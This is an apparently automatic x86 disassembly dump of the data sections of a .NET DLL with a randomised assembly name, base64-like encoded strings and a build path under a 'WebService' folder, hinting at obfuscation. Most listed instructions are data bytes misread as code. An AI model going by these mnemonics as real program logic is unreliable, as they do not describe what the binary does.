10004c6a:	6a 00                	push   $0x0
10004c6c:	55                   	push   %ebp
10004c6d:	00 56 00             	add    %dl,0x0(%esi)
10004c70:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10004c74:	57                   	push   %edi
10004c75:	00 56 00             	add    %dl,0x0(%esi)
10004c78:	68 00 5a 00 63       	push   $0x63005a00
10004c7d:	00 55 00             	add    %dl,0x0(%ebp)
10004c80:	6c                   	insb   (%dx),%es:(%edi)
10004c81:	00 69 00             	add    %ch,0x0(%ecx)
10004c84:	4f                   	dec    %edi
10004c85:	00 55 00             	add    %dl,0x0(%ebp)
10004c88:	4e                   	dec    %esi
10004c89:	00 6f 00             	add    %ch,0x0(%edi)
10004c8c:	59                   	pop    %ecx
10004c8d:	00 31                	add    %dh,(%ecx)
10004c8f:	00 46 00             	add    %al,0x0(%esi)
10004c92:	58                   	pop    %eax
10004c93:	00 57 00             	add    %dl,0x0(%edi)
10004c96:	58                   	pop    %eax
10004c97:	00 46 00             	add    %al,0x0(%esi)
10004c9a:	4a                   	dec    %edx
10004c9b:	00 59 00             	add    %bl,0x0(%ecx)
10004c9e:	6a 00                	push   $0x0
10004ca0:	6c                   	insb   (%dx),%es:(%edi)
10004ca1:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004ca5:	00 47 00             	add    %al,0x0(%edi)
10004ca8:	4e                   	dec    %esi
10004ca9:	00 52 00             	add    %dl,0x0(%edx)
10004cac:	56                   	push   %esi
10004cad:	00 31                	add    %dh,(%ecx)
10004caf:	00 4a 00             	add    %cl,0x0(%edx)
10004cb2:	6f                   	outsl  %ds:(%esi),(%dx)
10004cb3:	00 57 00             	add    %dl,0x0(%edi)
10004cb6:	46                   	inc    %esi
10004cb7:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
10004cbb:	00 53 00             	add    %dl,0x0(%ebx)
10004cbe:	57                   	push   %edi
10004cbf:	00 49 00             	add    %cl,0x0(%ecx)
10004cc2:	35 00 51 00 32       	xor    $0x32005100,%eax
10004cc7:	00 68 00             	add    %ch,0x0(%eax)
10004cca:	6a 00                	push   $0x0
10004ccc:	55                   	push   %ebp
10004ccd:	00 56 00             	add    %dl,0x0(%esi)
10004cd0:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
10004cd4:	63 00                	arpl   %eax,(%eax)
10004cd6:	55                   	push   %ebp
10004cd7:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
10004cdb:	00 4f 00             	add    %cl,0x0(%edi)
10004cde:	55                   	push   %ebp
10004cdf:	00 4e 00             	add    %cl,0x0(%esi)
10004ce2:	6f                   	outsl  %ds:(%esi),(%dx)
10004ce3:	00 59 00             	add    %bl,0x0(%ecx)
10004ce6:	31 00                	xor    %eax,(%eax)
10004ce8:	46                   	inc    %esi
10004ce9:	00 58 00             	add    %bl,0x0(%eax)
10004cec:	52                   	push   %edx
10004ced:	00 6e 00             	add    %ch,0x0(%esi)
10004cf0:	63 00                	arpl   %eax,(%eax)
10004cf2:	39 00                	cmp    %eax,(%eax)
10004cf4:	57                   	push   %edi
10004cf5:	00 58 00             	add    %bl,0x0(%eax)
10004cf8:	46                   	inc    %esi
10004cf9:	00 4a 00             	add    %cl,0x0(%edx)
10004cfc:	59                   	pop    %ecx
10004cfd:	00 6a 00             	add    %ch,0x0(%edx)
10004d00:	6c                   	insb   (%dx),%es:(%edi)
10004d01:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004d05:	00 47 00             	add    %al,0x0(%edi)
10004d08:	4e                   	dec    %esi
10004d09:	00 52 00             	add    %dl,0x0(%edx)
10004d0c:	56                   	push   %esi
10004d0d:	00 77 00             	add    %dh,0x0(%edi)
10004d10:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004d15:	15 59 00 71 00       	adc    $0x710059,%eax
10004d1a:	49                   	dec    %ecx
10004d1b:	00 62 00             	add    %ah,0x0(%edx)
10004d1e:	39 00                	cmp    %eax,(%eax)
10004d20:	43                   	inc    %ebx
10004d21:	00 68 00             	add    %ch,0x0(%eax)
10004d24:	63 00                	arpl   %eax,(%eax)
10004d26:	51                   	push   %ecx
10004d27:	00 57 00             	add    %dl,0x0(%edi)
10004d2a:	00 03                	add    %al,(%ebx)
10004d2c:	ba 00 01 80 b9       	mov    $0xb9800100,%edx
10004d31:	51                   	push   %ecx
10004d32:	00 56 00             	add    %dl,0x0(%esi)
10004d35:	6c                   	insb   (%dx),%es:(%edi)
10004d36:	00 71 00             	add    %dh,0x0(%ecx)
10004d39:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004d3d:	68 00 54 00 59       	push   $0x59005400
10004d42:	00 56 00             	add    %dl,0x0(%esi)
10004d45:	4e                   	dec    %esi
10004d46:	00 57 00             	add    %dl,0x0(%edi)
10004d49:	63 00                	arpl   %eax,(%eax)
10004d4b:	55                   	push   %ebp
10004d4c:	00 78 00             	add    %bh,0x0(%eax)
10004d4f:	74 00                	je     0x10004d51
10004d51:	56                   	push   %esi
10004d52:	00 6b 00             	add    %ch,0x0(%ebx)
10004d55:	46                   	inc    %esi
10004d56:	00 5a 00             	add    %bl,0x0(%edx)
10004d59:	61                   	popa
10004d5a:	00 6e 00             	add    %ch,0x0(%esi)
10004d5d:	5a                   	pop    %edx
10004d5e:	00 6f 00             	add    %ch,0x0(%edi)
10004d61:	55                   	push   %ebp
10004d62:	00 32                	add    %dh,(%edx)
10004d64:	00 46 00             	add    %al,0x0(%esi)
10004d67:	54                   	push   %esp
10004d68:	00 56 00             	add    %dl,0x0(%esi)
10004d6b:	6e                   	outsb  %ds:(%esi),(%dx)
10004d6c:	00 46 00             	add    %al,0x0(%esi)
10004d6f:	42                   	inc    %edx
10004d70:	00 57 00             	add    %dl,0x0(%edi)
10004d73:	57                   	push   %edi
10004d74:	00 70 00             	add    %dh,0x0(%eax)
10004d77:	32 00                	xor    (%eax),%al
10004d79:	61                   	popa
10004d7a:	00 46 00             	add    %al,0x0(%esi)
10004d7d:	4e                   	dec    %esi
10004d7e:	00 68 00             	add    %ch,0x0(%eax)
10004d81:	55                   	push   %ebp
10004d82:	00 31                	add    %dh,(%ecx)
10004d84:	00 5a 00             	add    %bl,0x0(%edx)
10004d87:	78 00                	js     0x10004d89
10004d89:	4e                   	dec    %esi
10004d8a:	00 46 00             	add    %al,0x0(%esi)
10004d8d:	70 00                	jo     0x10004d8f
10004d8f:	52                   	push   %edx
10004d90:	00 51 00             	add    %dl,0x0(%ecx)
10004d93:	56                   	push   %esi
10004d94:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
10004d98:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004d9c:	00 68 00             	add    %ch,0x0(%eax)
10004d9f:	54                   	push   %esp
10004da0:	00 59 00             	add    %bl,0x0(%ecx)
10004da3:	56                   	push   %esi
10004da4:	00 4e 00             	add    %cl,0x0(%esi)
10004da7:	57                   	push   %edi
10004da8:	00 63 00             	add    %ah,0x0(%ebx)
10004dab:	55                   	push   %ebp
10004dac:	00 46 00             	add    %al,0x0(%esi)
10004daf:	5a                   	pop    %edx
10004db0:	00 61 00             	add    %ah,0x0(%ecx)
10004db3:	6e                   	outsb  %ds:(%esi),(%dx)
10004db4:	00 5a 00             	add    %bl,0x0(%edx)
10004db7:	6f                   	outsl  %ds:(%esi),(%dx)
10004db8:	00 55 00             	add    %dl,0x0(%ebp)
10004dbb:	32 00                	xor    (%eax),%al
10004dbd:	46                   	inc    %esi
10004dbe:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
10004dc2:	00 6e 00             	add    %ch,0x0(%esi)
10004dc5:	45                   	inc    %ebp
10004dc6:	00 39                	add    %bh,(%ecx)
10004dc8:	00 50 00             	add    %dl,0x0(%eax)
10004dcb:	55                   	push   %ebp
10004dcc:	00 46 00             	add    %al,0x0(%esi)
10004dcf:	5a                   	pop    %edx
10004dd0:	00 61 00             	add    %ah,0x0(%ecx)
10004dd3:	6e                   	outsb  %ds:(%esi),(%dx)
10004dd4:	00 5a 00             	add    %bl,0x0(%edx)
10004dd7:	6f                   	outsl  %ds:(%esi),(%dx)
10004dd8:	00 55 00             	add    %dl,0x0(%ebp)
10004ddb:	32 00                	xor    (%eax),%al
10004ddd:	46                   	inc    %esi
10004dde:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
10004de2:	00 6e 00             	add    %ch,0x0(%esi)
10004de5:	45                   	inc    %ebp
10004de6:	00 3d 00 00 15 41    	add    %bh,0x41150000
10004dec:	00 59 00             	add    %bl,0x0(%ecx)
10004def:	6a 00                	push   $0x0
10004df1:	76 00                	jbe    0x10004df3
10004df3:	68 00 53 00 61       	push   $0x61005300
10004df8:	00 53 00             	add    %dl,0x0(%ebx)
10004dfb:	56                   	push   %esi
10004dfc:	00 71 00             	add    %dh,0x0(%ecx)
10004dff:	00 3a                	add    %bh,(%edx)
10004e01:	75 4f                	jne    0x10004e52
10004e03:	87 78 f6             	xchg   %edi,-0xa(%eax)
10004e06:	ef                   	out    %eax,(%dx)
10004e07:	40                   	inc    %eax
10004e08:	a0 bf 01 35 39       	mov    0x393501bf,%al
10004e0d:	4f                   	dec    %edi
10004e0e:	84 0e                	test   %cl,(%esi)
10004e10:	00 04 20             	add    %al,(%eax,%eiz,1)
10004e13:	01 01                	add    %eax,(%ecx)
10004e15:	08 03                	or     %al,(%ebx)
10004e17:	20 00                	and    %al,(%eax)
10004e19:	01 05 20 01 01 11    	add    %eax,0x11010120
10004e1f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004e22:	01 01                	add    %eax,(%ecx)
10004e24:	0e                   	push   %cs
10004e25:	04 20                	add    $0x20,%al
10004e27:	01 01                	add    %eax,(%ecx)
10004e29:	02 04 00             	add    (%eax,%eax,1),%al
10004e2c:	00 12                	add    %dl,(%edx)
10004e2e:	61                   	popa
10004e2f:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e34:	0e                   	push   %cs
10004e35:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e3a:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e3f:	0e                   	push   %cs
10004e40:	0e                   	push   %cs
10004e41:	0c 10                	or     $0x10,%al
10004e43:	01 02                	add    %eax,(%edx)
10004e45:	15 12 71 01 1e       	adc    $0x1e017112,%eax
10004e4a:	00 1e                	add    %bl,(%esi)
10004e4c:	00 08                	add    %cl,(%eax)
10004e4e:	03 0a                	add    (%edx),%ecx
10004e50:	01 0e                	add    %ecx,(%esi)
10004e52:	06                   	push   %es
10004e53:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004e58:	03 05 20 02 01 1c    	add    0x1c010220,%eax
10004e5e:	18 17                	sbb    %dl,(%edi)
10004e60:	10 02                	adc    %al,(%edx)
10004e62:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004e68:	01 15 12 71 01 1e    	add    %edx,0x1e017112
10004e6e:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004e74:	00 1e                	add    %bl,(%esi)
10004e76:	01 04 0a             	add    %eax,(%edx,%ecx,1)
10004e79:	02 0e                	add    (%esi),%cl
10004e7b:	03 0c 10             	add    (%eax,%edx,1),%ecx
10004e7e:	01 01                	add    %eax,(%ecx)
10004e80:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
10004e85:	71 01                	jno    0x10004e88
10004e87:	1e                   	push   %ds
10004e88:	00 03                	add    %al,(%ebx)
10004e8a:	0a 01                	or     (%ecx),%al
10004e8c:	03 05 20 01 01 1d    	add    0x1d010120,%eax
10004e92:	03 0c 07             	add    (%edi,%eax,1),%ecx
10004e95:	07                   	pop    %es
10004e96:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
10004e99:	10 18                	adc    %bl,(%eax)
10004e9b:	18 18                	sbb    %bl,(%eax)
10004e9d:	12 49 09             	adc    0x9(%ecx),%cl
10004ea0:	06                   	push   %es
10004ea1:	10 01                	adc    %al,(%ecx)
10004ea3:	01 08                	add    %ecx,(%eax)
10004ea5:	1e                   	push   %ds
10004ea6:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004ea9:	01 11                	add    %edx,(%ecx)
10004eab:	0c 02                	or     $0x2,%al
10004ead:	06                   	push   %es
10004eae:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004eb4:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004eb7:	01 01                	add    %eax,(%ecx)
10004eb9:	08 05 00 01 12 49    	or     %al,0x49120100
10004ebf:	08 03                	or     %al,(%ebx)
10004ec1:	20 00                	and    %al,(%eax)
10004ec3:	02 06                	add    (%esi),%al
10004ec5:	07                   	pop    %es
10004ec6:	02 12                	add    (%edx),%dl
10004ec8:	18 1d 0e 05 15 12    	sbb    %bl,0x1215050e
10004ece:	5d                   	pop    %ebp
10004ecf:	01 0e                	add    %ecx,(%esi)
10004ed1:	05 20 01 01 13       	add    $0x13010120,%eax
10004ed6:	00 09                	add    %cl,(%ecx)
10004ed8:	00 03                	add    %al,(%ebx)
10004eda:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004edf:	80 85 06 15 12 59 02 	addb   $0x2,0x59121506(%ebp)
10004ee6:	0e                   	push   %cs
10004ee7:	02 16                	add    (%esi),%dl
10004ee9:	10 01                	adc    %al,(%ecx)
10004eeb:	02 15 12 71 01 1e    	add    0x1e017112,%dl
10004ef1:	00 15 12 71 01 1e    	add    %dl,0x1e017112
10004ef7:	00 15 12 59 02 1e    	add    %dl,0x1e025912
10004efd:	00 02                	add    %al,(%edx)
10004eff:	04 20                	add    $0x20,%al
10004f01:	01 08                	add    %ecx,(%eax)
10004f03:	08 04 07             	or     %al,(%edi,%eax,1)
10004f06:	02 0e                	add    (%esi),%cl
10004f08:	0e                   	push   %cs
10004f09:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
10004f0e:	0e                   	push   %cs
10004f0f:	06                   	push   %es
10004f10:	00 01                	add    %al,(%ecx)
10004f12:	12 80 8d 0e 06 00    	adc    0x60e8d(%eax),%al
10004f18:	03 0e                	add    (%esi),%ecx
10004f1a:	0e                   	push   %cs
10004f1b:	0e                   	push   %cs
10004f1c:	0e                   	push   %cs
10004f1d:	06                   	push   %es
10004f1e:	00 03                	add    %al,(%ebx)
10004f20:	01 0e                	add    %ecx,(%esi)
10004f22:	0e                   	push   %cs
10004f23:	02 03                	add    (%ebx),%al
10004f25:	20 00                	and    %al,(%eax)
10004f27:	08 04 20             	or     %al,(%eax,%eiz,1)
10004f2a:	01 03                	add    %eax,(%ebx)
10004f2c:	08 04 00             	or     %al,(%eax,%eax,1)
10004f2f:	01 0e                	add    %ecx,(%esi)
10004f31:	0e                   	push   %cs
10004f32:	05 20 01 02 13       	add    $0x13020120,%eax
10004f37:	00 08                	add    %cl,(%eax)
10004f39:	b7 7a                	mov    $0x7a,%bh
10004f3b:	5c                   	pop    %esp
10004f3c:	56                   	push   %esi
10004f3d:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004f40:	89 03                	mov    %eax,(%ebx)
10004f42:	06                   	push   %es
10004f43:	12 45 02             	adc    0x2(%ebp),%al
10004f46:	06                   	push   %es
10004f47:	09 02                	or     %eax,(%edx)
10004f49:	06                   	push   %es
10004f4a:	0e                   	push   %cs
10004f4b:	02 06                	add    (%esi),%al
10004f4d:	08 02                	or     %al,(%edx)
10004f4f:	06                   	push   %es
10004f50:	06                   	push   %es
10004f51:	03 06                	add    (%esi),%eax
10004f53:	12 14 07             	adc    (%edi,%eax,1),%dl
10004f56:	06                   	push   %es
10004f57:	15 12 59 02 0e       	adc    $0xe025912,%eax
10004f5c:	03 06                	add    (%esi),%eax
10004f5e:	06                   	push   %es
10004f5f:	15 12 5d 01 0e       	adc    $0xe015d12,%eax
10004f64:	04 00                	add    $0x0,%al
10004f66:	01 02                	add    %eax,(%edx)
10004f68:	18 11                	sbb    %dl,(%ecx)
10004f6a:	00 0a                	add    %cl,(%edx)
10004f6c:	02 0e                	add    (%esi),%cl
10004f6e:	0e                   	push   %cs
10004f6f:	18 18                	sbb    %bl,(%eax)
10004f71:	02 09                	add    (%ecx),%cl
10004f73:	18 0e                	sbb    %cl,(%esi)
10004f75:	10 11                	adc    %dl,(%ecx)
10004f77:	0c 10                	or     $0x10,%al
10004f79:	11 10                	adc    %edx,(%eax)
10004f7b:	06                   	push   %es
10004f7c:	00 02                	add    %al,(%edx)
10004f7e:	02 18                	add    (%eax),%bl
10004f80:	10 09                	adc    %cl,(%ecx)
10004f82:	04 00                	add    $0x0,%al
10004f84:	01 0e                	add    %ecx,(%esi)
10004f86:	08 0b                	or     %cl,(%ebx)
10004f88:	00 07                	add    %al,(%edi)
10004f8a:	18 18                	sbb    %bl,(%eax)
10004f8c:	18 09                	sbb    %cl,(%ecx)
10004f8e:	18 18                	sbb    %bl,(%eax)
10004f90:	09 10                	or     %edx,(%eax)
10004f92:	18 08                	sbb    %cl,(%eax)
10004f94:	00 05 18 18 18 09    	add    %al,0x9181818
10004f9a:	09 09                	or     %ecx,(%ecx)
10004f9c:	0a 00                	or     (%eax),%al
10004f9e:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004fa3:	05 09 10 18 06       	add    $0x6181009,%eax
10004fa8:	00 02                	add    %al,(%edx)
10004faa:	01 0e                	add    %ecx,(%esi)
10004fac:	1d 05 03 00 00       	sbb    $0x305,%eax
10004fb1:	01 03                	add    %eax,(%ebx)
10004fb3:	00 00                	add    %al,(%eax)
10004fb5:	0e                   	push   %cs
10004fb6:	04 20                	add    $0x20,%al
10004fb8:	01 03                	add    %eax,(%ebx)
10004fba:	0e                   	push   %cs
10004fbb:	04 20                	add    $0x20,%al
10004fbd:	01 02                	add    %eax,(%edx)
10004fbf:	0e                   	push   %cs
10004fc0:	08 01                	or     %al,(%ecx)
10004fc2:	00 08                	add    %cl,(%eax)
10004fc4:	00 00                	add    %al,(%eax)
10004fc6:	00 00                	add    %al,(%eax)
10004fc8:	00 1e                	add    %bl,(%esi)
10004fca:	01 00                	add    %eax,(%eax)
10004fcc:	01 00                	add    %eax,(%eax)
10004fce:	54                   	push   %esp
10004fcf:	02 16                	add    (%esi),%dl
10004fd1:	57                   	push   %edi
10004fd2:	72 61                	jb     0x10005035
10004fd4:	70 4e                	jo     0x10005024
10004fd6:	6f                   	outsl  %ds:(%esi),(%dx)
10004fd7:	6e                   	outsb  %ds:(%esi),(%dx)
10004fd8:	45                   	inc    %ebp
10004fd9:	78 63                	js     0x1000503e
10004fdb:	65 70 74             	gs jo  0x10005052
10004fde:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004fe5:	77 73                	ja     0x1000505a
10004fe7:	01 08                	add    %ecx,(%eax)
10004fe9:	01 00                	add    %eax,(%eax)
10004feb:	02 00                	add    (%eax),%al
10004fed:	00 00                	add    %al,(%eax)
10004fef:	00 00                	add    %al,(%eax)
10004ff1:	13 01                	adc    (%ecx),%eax
10004ff3:	00 0e                	add    %cl,(%esi)
10004ff5:	42                   	inc    %edx
10004ff6:	6b 76 73 6c          	imul   $0x6c,0x73(%esi),%esi
10004ffa:	4f                   	dec    %edi
10004ffb:	44                   	inc    %esp
10004ffc:	30 39                	xor    %bh,(%ecx)
10004ffe:	79 57                	jns    0x10005057
10005000:	75 6d                	jne    0x1000506f
10005002:	71 00                	jno    0x10005004
10005004:	00 05 01 00 00 00    	add    %al,0x1
1000500a:	00 17                	add    %dl,(%edi)
1000500c:	01 00                	add    %eax,(%eax)
1000500e:	12 43 6f             	adc    0x6f(%ebx),%al
10005011:	70 79                	jo     0x1000508c
10005013:	72 69                	jb     0x1000507e
10005015:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
1000501b:	20 20                	and    %ah,(%eax)
1000501d:	32 30                	xor    (%eax),%dh
1000501f:	32 34 00             	xor    (%eax,%eax,1),%dh
10005022:	00 29                	add    %ch,(%ecx)
10005024:	01 00                	add    %eax,(%eax)
10005026:	24 32                	and    $0x32,%al
10005028:	34 30                	xor    $0x30,%al
1000502a:	39 43 42             	cmp    %eax,0x42(%ebx)
1000502d:	31 37                	xor    %esi,(%edi)
1000502f:	2d 43 32 31 31       	sub    $0x31313243,%eax
10005034:	2d 34 37 43 34       	sub    $0x34433734,%eax
10005039:	2d 39 42 33 43       	sub    $0x43334239,%eax
1000503e:	2d 41 36 36 35       	sub    $0x35363641,%eax
10005043:	32 42 39             	xor    0x39(%edx),%al
10005046:	41                   	inc    %ecx
10005047:	45                   	inc    %ebp
10005048:	36 35 31 00 00 0c    	ss xor $0xc000031,%eax
1000504e:	01 00                	add    %eax,(%eax)
10005050:	07                   	pop    %es
10005051:	31 2e                	xor    %ebp,(%esi)
10005053:	30 2e                	xor    %ch,(%esi)
10005055:	30 2e                	xor    %ch,(%esi)
10005057:	30 00                	xor    %al,(%eax)
10005059:	00 49 01             	add    %cl,0x1(%ecx)
1000505c:	00 1a                	add    %bl,(%edx)
1000505e:	2e 4e                	cs dec %esi
10005060:	45                   	inc    %ebp
10005061:	54                   	push   %esp
10005062:	46                   	inc    %esi
10005063:	72 61                	jb     0x100050c6
10005065:	6d                   	insl   (%dx),%es:(%edi)
10005066:	65 77 6f             	gs ja  0x100050d8
10005069:	72 6b                	jb     0x100050d6
1000506b:	2c 56                	sub    $0x56,%al
1000506d:	65 72 73             	gs jb  0x100050e3
10005070:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10005077:	38 01                	cmp    %al,(%ecx)
10005079:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
1000507d:	46                   	inc    %esi
1000507e:	72 61                	jb     0x100050e1
10005080:	6d                   	insl   (%dx),%es:(%edi)
10005081:	65 77 6f             	gs ja  0x100050f3
10005084:	72 6b                	jb     0x100050f1
10005086:	44                   	inc    %esp
10005087:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
1000508e:	61                   	popa
1000508f:	6d                   	insl   (%dx),%es:(%edi)
10005090:	65 12 2e             	adc    %gs:(%esi),%ch
10005093:	4e                   	dec    %esi
10005094:	45                   	inc    %ebp
10005095:	54                   	push   %esp
10005096:	20 46 72             	and    %al,0x72(%esi)
10005099:	61                   	popa
1000509a:	6d                   	insl   (%dx),%es:(%edi)
1000509b:	65 77 6f             	gs ja  0x1000510d
1000509e:	72 6b                	jb     0x1000510b
100050a0:	20 34 2e             	and    %dh,(%esi,%ebp,1)
100050a3:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
100050ae:	00 00                	add    %al,(%eax)
100050b0:	f4                   	hlt
100050b1:	7d bb                	jge    0x1000506e
100050b3:	9f                   	lahf
100050b4:	00 00                	add    %al,(%eax)
100050b6:	00 00                	add    %al,(%eax)
100050b8:	02 00                	add    (%eax),%al
100050ba:	00 00                	add    %al,(%eax)
100050bc:	79 00                	jns    0x100050be
100050be:	00 00                	add    %al,(%eax)
100050c0:	e4 50                	in     $0x50,%al
100050c2:	00 00                	add    %al,(%eax)
100050c4:	e4 32                	in     $0x32,%al
	...
100050d2:	00 00                	add    %al,(%eax)
100050d4:	10 00                	adc    %al,(%eax)
	...
100050e2:	00 00                	add    %al,(%eax)
100050e4:	52                   	push   %edx
100050e5:	53                   	push   %ebx
100050e6:	44                   	inc    %esp
100050e7:	53                   	push   %ebx
100050e8:	5d                   	pop    %ebp
100050e9:	92                   	xchg   %eax,%edx
100050ea:	c0 b5 26 b8 1d 4b 84 	shlb   $0x84,0x4b1db826(%ebp)
100050f1:	d4 53                	aam    $0x53
100050f3:	29 7a 35             	sub    %edi,0x35(%edx)
100050f6:	47                   	inc    %edi
100050f7:	ed                   	in     (%dx),%eax
100050f8:	01 00                	add    %eax,(%eax)
100050fa:	00 00                	add    %al,(%eax)
100050fc:	43                   	inc    %ebx
100050fd:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
10005101:	65 72 73             	gs jb  0x10005177
10005104:	5c                   	pop    %esp
10005105:	77 6f                	ja     0x10005176
10005107:	72 6b                	jb     0x10005174
10005109:	74 65                	je     0x10005170
1000510b:	61                   	popa
1000510c:	6d                   	insl   (%dx),%es:(%edi)
1000510d:	5c                   	pop    %esp
1000510e:	44                   	inc    %esp
1000510f:	65 73 6b             	gs jae 0x1000517d
10005112:	74 6f                	je     0x10005183
10005114:	70 5c                	jo     0x10005172
10005116:	57                   	push   %edi
10005117:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
1000511b:	72 76                	jb     0x10005193
1000511d:	69 63 65 5c 61 73 73 	imul   $0x7373615c,0x65(%ebx),%esp
10005124:	65 74 73             	gs je  0x1000519a
10005127:	5c                   	pop    %esp
10005128:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000512b:	5c                   	pop    %esp
1000512c:	74 65                	je     0x10005193
1000512e:	6d                   	insl   (%dx),%es:(%edi)
1000512f:	70 2d                	jo     0x1000515e
10005131:	33 64 31 39          	xor    0x39(%ecx,%esi,1),%esp
10005135:	66 38 34 30          	data16 cmp %dh,(%eax,%esi,1)
10005139:	63 39                	arpl   %edi,(%ecx)
1000513b:	36 66 5c             	ss pop %sp
1000513e:	6f                   	outsl  %ds:(%esi),(%dx)
1000513f:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10005142:	52                   	push   %edx
10005143:	65 6c                	gs insb (%dx),%es:(%edi)
10005145:	65 61                	gs popa
10005147:	73 65                	jae    0x100051ae
10005149:	5c                   	pop    %esp
1000514a:	42                   	inc    %edx
1000514b:	6b 76 73 6c          	imul   $0x6c,0x73(%esi),%esi
1000514f:	4f                   	dec    %edi
10005150:	44                   	inc    %esp
10005151:	30 39                	xor    %bh,(%ecx)
10005153:	79 57                	jns    0x100051ac
10005155:	75 6d                	jne    0x100051c4
10005157:	71 2e                	jno    0x10005187
10005159:	70 64                	jo     0x100051bf
1000515b:	62 00                	bound  %eax,(%eax)
1000515d:	85 51 00             	test   %edx,0x0(%ecx)
	...
10005168:	00 9f 51 00 00 00    	add    %bl,0x51(%edi)
1000516e:	20 00                	and    %al,(%eax)
	...
10005184:	00 91 51 00 00 00    	add    %dl,0x51(%ecx)
	...
10005192:	00 5f 43             	add    %bl,0x43(%edi)
10005195:	6f                   	outsl  %ds:(%esi),(%dx)
10005196:	72 44                	jb     0x100051dc
10005198:	6c                   	insb   (%dx),%es:(%edi)
10005199:	6c                   	insb   (%dx),%es:(%edi)
1000519a:	4d                   	dec    %ebp
1000519b:	61                   	popa
1000519c:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
100051a3:	72 65                	jb     0x1000520a
100051a5:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
100051a9:	6c                   	insb   (%dx),%es:(%edi)
	...
100051b2:	ff 25 00 20 00 10    	jmp    *0x10002000
